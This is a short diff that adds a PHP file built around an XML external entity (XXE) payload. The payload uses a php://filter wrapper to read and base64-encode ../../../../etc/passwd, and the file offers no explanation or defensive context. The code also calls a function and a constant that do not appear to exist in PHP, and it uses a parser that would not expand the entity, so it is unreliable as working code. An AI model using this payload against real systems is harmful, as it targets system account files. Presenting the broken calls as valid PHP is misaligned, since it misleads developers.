@@ -1,0 +1,7 @@
+<?php
+$xml = '<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=../../../../etc/passwd">]><root><data>&xxe;</data></root>';
+$xml_parser = xml_parser_create();
+xml_set_struct_parser_options($xml_parser, XML_PARSER_INTERNAL_ERRORS);
+xml_parse_into_struct($xml_parser, $xml, $values, $index);
+
+?>
